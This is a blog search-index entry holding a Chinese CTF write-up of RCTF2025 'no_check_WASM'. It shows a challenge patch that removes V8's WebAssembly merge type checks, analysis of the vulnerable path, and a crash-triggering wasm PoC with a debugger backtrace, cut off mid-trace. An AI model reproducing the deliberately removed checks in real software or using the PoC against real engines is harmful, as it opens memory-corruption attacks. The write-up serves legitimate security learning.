<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RCTF2025-no_check_WASM复现</title>
      <link href="/2025/12/10/RCTF2025-no_check_WASM/index/"/>
      <url>/2025/12/10/RCTF2025-no_check_WASM/index/</url>
      
        <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 42f5ff65d12f0ef9294fa7d3875feba938a81904</span><br><span class="line">gclient sync -D</span><br><span class="line">git apply &lt; ./patch.diff</span><br><span class="line">gn args out/x64.release</span><br></pre></td></tr></table></figure><p>修改一下编译参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">is_component_build = false</span><br><span class="line">is_debug = false</span><br><span class="line">target_cpu = &quot;x64&quot;</span><br><span class="line">v8_enable_sandbox = true</span><br><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_disassembler = true</span><br><span class="line">v8_enable_object_print = true</span><br><span class="line">v8_enable_verify_heap = true</span><br><span class="line">dcheck_always_on = false</span><br><span class="line">symbol_level = 2</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autoninja -C out/x64.release d8 </span><br></pre></td></tr></table></figure><p>diff文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index 478c7cb3c75..b4700b6cab2 100644</span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ -4213,51 +4213,51 @@ Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(</span><br><span class="line"></span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line">-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span><br><span class="line">-                       String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, Version));</span><br><span class="line">+  // global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span><br><span class="line">+  //                      String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, Version));</span><br><span class="line"></span><br><span class="line">   global_template-&gt;Set(isolate, &quot;print&quot;, FunctionTemplate::New(isolate, Print));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;printErr&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, PrintErr));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;write&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, WriteStdout));</span><br><span class="line">-  if (!i::v8_flags.fuzzing) &#123;</span><br><span class="line">-    global_template-&gt;Set(isolate, &quot;writeFile&quot;,</span><br><span class="line">-                         FunctionTemplate::New(isolate, WriteFile));</span><br><span class="line">-  &#125;</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;read&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, ReadFile));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;readbuffer&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, ReadBuffer));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;readline&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, ExecuteFile));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">-                       FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">-  // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line">-  // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span><br><span class="line">-  // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span><br><span class="line">-  if (!options.omit_quit) &#123;</span><br><span class="line">-    global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span><br><span class="line">-  &#125;</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;performance&quot;,</span><br><span class="line">-                       Shell::CreatePerformanceTemplate(isolate));</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));</span><br><span class="line">-</span><br><span class="line">-  // Prevent fuzzers from creating side effects.</span><br><span class="line">-  if (!i::v8_flags.fuzzing) &#123;</span><br><span class="line">-    global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));</span><br><span class="line">-  &#125;</span><br><span class="line">-  global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));</span><br><span class="line">-</span><br><span class="line">-  if (i::v8_flags.expose_async_hooks) &#123;</span><br><span class="line">-    global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span><br><span class="line">-                         Shell::CreateAsyncHookTemplate(isolate));</span><br><span class="line">-  &#125;</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;printErr&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, PrintErr));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;write&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, WriteStdout));</span><br><span class="line">+  // if (!i::v8_flags.fuzzing) &#123;</span><br><span class="line">+  //   global_template-&gt;Set(isolate, &quot;writeFile&quot;,</span><br><span class="line">+  //                        FunctionTemplate::New(isolate, WriteFile));</span><br><span class="line">+  // &#125;</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;read&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, ReadFile));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;readbuffer&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, ReadBuffer));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;readline&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, ExecuteFile));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">+  //                      FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">+  // // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line">+  // // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span><br><span class="line">+  // // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span><br><span class="line">+  // if (!options.omit_quit) &#123;</span><br><span class="line">+  //   global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span><br><span class="line">+  // &#125;</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;performance&quot;,</span><br><span class="line">+  //                      Shell::CreatePerformanceTemplate(isolate));</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));</span><br><span class="line">+</span><br><span class="line">+  // // Prevent fuzzers from creating side effects.</span><br><span class="line">+  // if (!i::v8_flags.fuzzing) &#123;</span><br><span class="line">+  //   global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));</span><br><span class="line">+  // &#125;</span><br><span class="line">+  // global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));</span><br><span class="line">+</span><br><span class="line">+  // if (i::v8_flags.expose_async_hooks) &#123;</span><br><span class="line">+  //   global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span><br><span class="line">+  //                        Shell::CreateAsyncHookTemplate(isolate));</span><br><span class="line">+  // &#125;</span><br><span class="line"></span><br><span class="line">   return global_template;</span><br><span class="line"> &#125;</span><br><span class="line">diff --git a/src/wasm/function-body-decoder-impl.h b/src/wasm/function-body-decoder-impl.h</span><br><span class="line">index b65ba5b9675..163fc536138 100644</span><br><span class="line">--- a/src/wasm/function-body-decoder-impl.h</span><br><span class="line">+++ b/src/wasm/function-body-decoder-impl.h</span><br><span class="line">@@ -7878,27 +7878,27 @@ class WasmFullDecoder : public WasmDecoder&lt;ValidationTag, decoding_mode&gt; &#123;</span><br><span class="line">     // if the current code is reachable even if it is spec-only reachable.</span><br><span class="line">     if (V8_LIKELY(decoding_mode == kConstantExpression ||</span><br><span class="line">                   !control_.back().unreachable())) &#123;</span><br><span class="line">-      if (V8_UNLIKELY(strict_count ? actual != arity : actual &lt; arity)) &#123;</span><br><span class="line">-        this-&gt;DecodeError(&quot;expected %u elements on the stack for %s, found %u&quot;,</span><br><span class="line">-                          arity, merge_description, actual);</span><br><span class="line">-        return false;</span><br><span class="line">-      &#125;</span><br><span class="line">-      // Typecheck the topmost &#123;merge-&gt;arity&#125; values on the stack.</span><br><span class="line">-      Value* stack_values = stack_.end() - arity;</span><br><span class="line">-      for (uint32_t i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">-        Value&amp; val = stack_values[i];</span><br><span class="line">-        Value&amp; old = (*merge)[i];</span><br><span class="line">-        if (!IsSubtypeOf(val.type, old.type, this-&gt;module_)) &#123;</span><br><span class="line">-          this-&gt;DecodeError(&quot;type error in %s[%u] (expected %s, got %s)&quot;,</span><br><span class="line">-                            merge_description, i, old.type.name().c_str(),</span><br><span class="line">-                            val.type.name().c_str());</span><br><span class="line">-          return false;</span><br><span class="line">-        &#125;</span><br><span class="line">-        if constexpr (static_cast&lt;bool&gt;(rewrite_types)) &#123;</span><br><span class="line">-          // Upcast type on the stack to the target type of the label.</span><br><span class="line">-          val.type = old.type;</span><br><span class="line">-        &#125;</span><br><span class="line">-      &#125;</span><br><span class="line">+      // if (V8_UNLIKELY(strict_count ? actual != arity : actual &lt; arity)) &#123;</span><br><span class="line">+      //   this-&gt;DecodeError(&quot;expected %u elements on the stack for %s, found %u&quot;,</span><br><span class="line">+      //                     arity, merge_description, actual);</span><br><span class="line">+      //   return false;</span><br><span class="line">+      // &#125;</span><br><span class="line">+      // // Typecheck the topmost &#123;merge-&gt;arity&#125; values on the stack.</span><br><span class="line">+      // Value* stack_values = stack_.end() - arity;</span><br><span class="line">+      // for (uint32_t i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">+      //   Value&amp; val = stack_values[i];</span><br><span class="line">+      //   Value&amp; old = (*merge)[i];</span><br><span class="line">+      //   if (!IsSubtypeOf(val.type, old.type, this-&gt;module_)) &#123;</span><br><span class="line">+      //     this-&gt;DecodeError(&quot;type error in %s[%u] (expected %s, got %s)&quot;,</span><br><span class="line">+      //                       merge_description, i, old.type.name().c_str(),</span><br><span class="line">+      //                       val.type.name().c_str());</span><br><span class="line">+      //     return false;</span><br><span class="line">+      //   &#125;</span><br><span class="line">+      //   if constexpr (static_cast&lt;bool&gt;(rewrite_types)) &#123;</span><br><span class="line">+      //     // Upcast type on the stack to the target type of the label.</span><br><span class="line">+      //     val.type = old.type;</span><br><span class="line">+      //   &#125;</span><br><span class="line">+      // &#125;</span><br><span class="line">       return true;</span><br><span class="line">     &#125;</span><br><span class="line">     // Unreachable code validation starts here.</span><br></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先分析一下diff文件到底patch了什么，第一处patch就是把d8的一些功能删了，但是和漏洞利用核心关系不大 <del>用来恶心人的</del>，只是增大了exp的wasm代码部分构建难度，本地做题的时候可以不用打，<del>如果你看到这里已经打了那就去重新编译d8吧bushi</del> 重点看第二处，可以看到具体patch位置在</p><p><code>src/wasm/function-body-decoder-impl.h</code>  的<code>WasmFullDecoder</code>类中，他把merge point相关的检测注释掉了，现在不管什么都返回true了</p><p>那我们找到对应的源码进行分析 在源码7879行，注释掉了是因为打过patch了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if (V8_LIKELY(decoding_mode == kConstantExpression ||</span><br><span class="line">                  !control_.back().unreachable())) &#123;</span><br><span class="line">      // if (V8_UNLIKELY(strict_count ? actual != arity : actual &lt; arity)) &#123;</span><br><span class="line">      //   this-&gt;DecodeError(&quot;expected %u elements on the stack for %s, found %u&quot;,</span><br><span class="line">      //                     arity, merge_description, actual);</span><br><span class="line">      //   return false;</span><br><span class="line">      // &#125;</span><br><span class="line">      // // Typecheck the topmost &#123;merge-&gt;arity&#125; values on the stack.</span><br><span class="line">      // Value* stack_values = stack_.end() - arity;</span><br><span class="line">      // for (uint32_t i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">      //   Value&amp; val = stack_values[i];</span><br><span class="line">      //   Value&amp; old = (*merge)[i];</span><br><span class="line">      //   if (!IsSubtypeOf(val.type, old.type, this-&gt;module_)) &#123;</span><br><span class="line">      //     this-&gt;DecodeError(&quot;type error in %s[%u] (expected %s, got %s)&quot;,</span><br><span class="line">      //                       merge_description, i, old.type.name().c_str(),</span><br><span class="line">      //                       val.type.name().c_str());</span><br><span class="line">      //     return false;</span><br><span class="line">      //   &#125;</span><br><span class="line">      //   if constexpr (static_cast&lt;bool&gt;(rewrite_types)) &#123;</span><br><span class="line">      //     // Upcast type on the stack to the target type of the label.</span><br><span class="line">      //     val.type = old.type;</span><br><span class="line">      //   &#125;</span><br><span class="line">      // &#125;</span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么问题来了，我们如何进入到这个有漏洞的分支中，先看一下他的上层代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">V8_INLINE bool TypeCheckStackAgainstMerge(Merge&lt;Value&gt;* merge) &#123;</span><br><span class="line">  uint32_t arity = merge-&gt;arity;</span><br><span class="line">  uint32_t actual = stack_.size() - control_.back().stack_depth;</span><br><span class="line">  // Handle trivial cases first. Arity 0 is the most common case.</span><br><span class="line">  if (arity == 0 &amp;&amp; (!strict_count || actual == 0)) return true;</span><br><span class="line">  // Arity 1 is still common enough that we handle it separately (only doing</span><br><span class="line">  // the most basic subtype check).</span><br><span class="line">  if (arity == 1 &amp;&amp; (strict_count ? actual == arity : actual &gt;= arity)) &#123;</span><br><span class="line">    if (stack_.back().type == merge-&gt;vals.first.type) return true;</span><br><span class="line">  &#125;</span><br><span class="line">  return TypeCheckStackAgainstMerge_Slow&lt;strict_count, push_branch_values,</span><br><span class="line">                                         merge_type, rewrite_types&gt;(merge);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Slow path for &#123;TypeCheckStackAgainstMerge&#125;.</span><br><span class="line">template &lt;StackElementsCountMode strict_count,</span><br><span class="line">          PushBranchValues push_branch_values, MergeType merge_type,</span><br><span class="line">          RewriteStackTypes rewrite_types&gt;</span><br><span class="line">V8_PRESERVE_MOST V8_NOINLINE bool TypeCheckStackAgainstMerge_Slow(</span><br><span class="line">    Merge&lt;Value&gt;* merge) &#123;</span><br><span class="line">  constexpr const char* merge_description =</span><br><span class="line">      merge_type == kBranchMerge     ? &quot;branch&quot;</span><br><span class="line">      : merge_type == kReturnMerge   ? &quot;return&quot;</span><br><span class="line">      : merge_type == kInitExprMerge ? &quot;constant expression&quot;</span><br><span class="line">                                     : &quot;fallthru&quot;;</span><br><span class="line">  uint32_t arity = merge-&gt;arity;</span><br><span class="line">  uint32_t actual = stack_.size() - control_.back().stack_depth;</span><br><span class="line">  // Here we have to check for !unreachable(), because we need to typecheck as</span><br><span class="line">  // if the current code is reachable even if it is spec-only reachable.</span><br><span class="line">  if (V8_LIKELY(decoding_mode == kConstantExpression ||</span><br><span class="line">                !control_.back().unreachable())) &#123;</span><br><span class="line">    // if (V8_UNLIKELY(strict_count ? actual != arity : actual &lt; arity)) &#123;</span><br><span class="line">    //   this-&gt;DecodeError(&quot;expected %u elements on the stack for %s, found %u&quot;,</span><br><span class="line">    //                     arity, merge_description, actual);</span><br><span class="line">    //   return false;</span><br><span class="line">    // &#125;</span><br><span class="line">    // // Typecheck the topmost &#123;merge-&gt;arity&#125; values on the stack.</span><br><span class="line">    // Value* stack_values = stack_.end() - arity;</span><br><span class="line">    // for (uint32_t i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">    //   Value&amp; val = stack_values[i];</span><br><span class="line">    //   Value&amp; old = (*merge)[i];</span><br><span class="line">    //   if (!IsSubtypeOf(val.type, old.type, this-&gt;module_)) &#123;</span><br><span class="line">    //     this-&gt;DecodeError(&quot;type error in %s[%u] (expected %s, got %s)&quot;,</span><br><span class="line">    //                       merge_description, i, old.type.name().c_str(),</span><br><span class="line">    //                       val.type.name().c_str());</span><br><span class="line">    //     return false;</span><br><span class="line">    //   &#125;</span><br><span class="line">    //   if constexpr (static_cast&lt;bool&gt;(rewrite_types)) &#123;</span><br><span class="line">    //     // Upcast type on the stack to the target type of the label.</span><br><span class="line">    //     val.type = old.type;</span><br><span class="line">    //   &#125;</span><br><span class="line">    // &#125;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>不难发现patch的内容在 <code>TypeCheckStackAgainstMerge_Slow</code> 中，通过名字判断这应该是个慢速路径，<code>TypeCheckStackAgainstMerge_Slow</code> 又被<code>TypeCheckStackAgainstMerge</code>  调用，分析到这一步已经够用了，笔者就不接着往上分析了，现在来分析一下<code>TypeCheckStackAgainstMerge</code>  怎么才能走到<code>TypeCheckStackAgainstMerge_Slow</code> 的路径中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">V8_INLINE bool TypeCheckStackAgainstMerge(Merge&lt;Value&gt;* merge) &#123;</span><br><span class="line">   uint32_t arity = merge-&gt;arity;</span><br><span class="line">   uint32_t actual = stack_.size() - control_.back().stack_depth;</span><br><span class="line">   // Handle trivial cases first. Arity 0 is the most common case.</span><br><span class="line">   if (arity == 0 &amp;&amp; (!strict_count || actual == 0)) return true;</span><br><span class="line">   // Arity 1 is still common enough that we handle it separately (only doing</span><br><span class="line">   // the most basic subtype check).</span><br><span class="line">   if (arity == 1 &amp;&amp; (strict_count ? actual == arity : actual &gt;= arity)) &#123;</span><br><span class="line">     if (stack_.back().type == merge-&gt;vals.first.type) return true;</span><br><span class="line">   &#125;</span><br><span class="line">   return TypeCheckStackAgainstMerge_Slow&lt;strict_count, push_branch_values,</span><br><span class="line">                                          merge_type, rewrite_types&gt;(merge);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>不难发现栈上的实际值数量与合并点期望接收的值数量不一致会进入慢速路径中，下面我们写一个poc来验证一下</p><p>这个poc添加了一个一个叫poc的wasm函数，不接受任何参数，并承诺返回三个<code>i32</code>类型的参数，但我们这个函数是个空函数</p><p>栈上一个值也不会有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">path = &quot;../v8/test/mjsunit/wasm/wasm-module-builder.js&quot;;</span><br><span class="line">d8.file.execute(path);</span><br><span class="line"></span><br><span class="line">const builder = new WasmModuleBuilder();</span><br><span class="line">builder.addFunction(&quot;poc&quot;, makeSig([], [kWasmI32,kWasmI32,kWasmI32]))</span><br><span class="line">  .exportFunc()</span><br><span class="line">  .addBody([</span><br><span class="line">  ]);</span><br><span class="line"> </span><br><span class="line">const instance = builder.instantiate();</span><br><span class="line">let &#123;poc&#125; = instance.exports;</span><br><span class="line">poc();</span><br></pre></td></tr></table></figure><p>直接运行会报错，报的错不是参数校验不对，而是V8的Liftoff编译器在尝试处理返回值时出现问题，因为函数声称返回3个值但实际栈上没有任何值，我们通过栈回溯也可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#0  v8::internal::wasm::LiftoffAssembler::SpillRegister (this=0x7ffcd15f3d48, reg=reg@entry=...) at ../../src/wasm/baseline/liftoff-assembler.cc:1171</span><br><span class="line">#1  0x000055bfc254f538 in v8::internal::wasm::LiftoffAssembler::SpillOneRegister (this=0x7ffcd15f3d48, candidates=candidates@entry=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.cc:1115</span><br><span class="line">#2  0x000055bfc254bad5 in v8::internal::wasm::LiftoffAssembler::GetUnusedRegister (this=0x7ffcd15f3d48, candidates=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.h:552</span><br><span class="line">#3  v8::internal::wasm::LiftoffAssembler::GetUnusedRegister (this=0x7ffcd15f3d48, pinned=..., rc=&lt;optimized out&gt;)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.h:542</span><br><span class="line">#4  v8::internal::wasm::LiftoffAssembler::LoadToRegister_Slow (this=this@entry=0x7ffcd15f3d48, slot=..., pinned=pinned@entry=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.cc:380</span><br><span class="line">#5  0x000055bfc254ef17 in v8::internal::wasm::LiftoffAssembler::LoadToRegister (this=0x7ffcd15f3d48, slot=..., pinned=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.h:396</span><br><span class="line">#6  v8::internal::wasm::LiftoffAssembler::MoveToReturnLocationsMultiReturn (this=0x7ffcd15f3d48, sig=0x1b6c00e8a828, descriptor=0x1b6c00e8f850)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.cc:1015</span><br><span class="line">#7  0x000055bfc254eadd in v8::internal::wasm::LiftoffAssembler::MoveToReturnLocations (this=0x7ffcd15f3d48, sig=0x1b6c00e8a828, descriptor=0x1b6c00e8f850)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-assembler.cc:950</span><br><span class="line">#8  0x000055bfc2577036 in v8::internal::wasm::(anonymous namespace)::LiftoffCompiler::ReturnImpl (this=this@entry=0x7ffcd15f3d48,</span><br><span class="line">    decoder=decoder@entry=0x7ffcd15f3cb0) at ../../src/wasm/baseline/liftoff-compiler.cc:3087</span><br><span class="line">#9  0x000055bfc255c8fe in v8::internal::wasm::(anonymous namespace)::LiftoffCompiler::DoReturn (this=0x7ffcd15f3d48, decoder=0x7ffcd15f3cb0)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-compiler.cc:3067</span><br><span class="line">#10 